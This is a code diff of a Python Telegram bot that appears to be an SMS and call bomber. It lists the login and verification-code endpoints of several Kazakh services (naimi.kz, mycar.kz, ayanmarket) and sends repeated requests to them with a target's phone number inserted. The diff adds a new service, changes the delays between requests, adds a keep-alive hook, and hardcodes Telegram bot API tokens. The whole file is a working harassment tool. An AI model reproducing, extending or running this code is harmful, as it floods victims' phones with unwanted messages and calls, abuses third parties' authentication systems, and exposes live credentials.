@@ -4,8 +4,11 @@ import re
 from random import choice
 from concurrent.futures import ThreadPoolExecutor
 import time
+import os
+from keep_alive import keep_alive
+keep_alive()
 
-API_TOKEN = '8009842396:AAHpet8ZD5wQDeafi3bgiQZJE5G6KqB0WR8'
+API_TOKEN = '7812192241:AAGgCq2diRqxAlH1OfJGmJWWfu76PT4zlqg'
 OWNER_ID = 7268545025
 
 bot = telebot.TeleBot(API_TOKEN)
@@ -51,7 +54,7 @@ SERVICES = {
         "phone_f": 2,
         "method": "POST",
         "data": {"phone": "%NUMBER%", "type": "sms"},
-        "delay": 2.5
+        "delay": 3
     },
     "naimi_call": {
         "url": "https://naimi.kz/api/app/pub/login/code",
@@ -59,7 +62,14 @@ SERVICES = {
         "method": "POST",
         "data": {"phone": "%NUMBER%", "type": "call"},
         "delay": 2.5
-    }
+    },
+    "mycar": {
+        "url": "https://sso.mycar.kz/auth/login/",
+        "phone_f": 0,
+        "method": "POST",
+        "data": {"phone_number": "%NUMBER%"},
+        "delay": 60
+}
 }
 
 # Счетчики успешных и неуспешных запросов
@@ -88,6 +98,8 @@ def send_sms_to_ayanmarket(phone):
             failure_count["ayanmarket"] += 1
     except Exception:
         failure_count["ayanmarket"] += 1
+
+    time.sleep(30)
 
 # Команда /start
 @bot.message_handler(commands=['start'])
@@ -197,6 +209,7 @@ def send_to_service(chat_id, service_name, service_info, phone):
             failure_count[service_name] += 1
     except Exception:
         failure_count[service_name] += 1
+    time.sleep(service_info["delay"])
 
 if __name__ == '__main__':
     bot.polling()
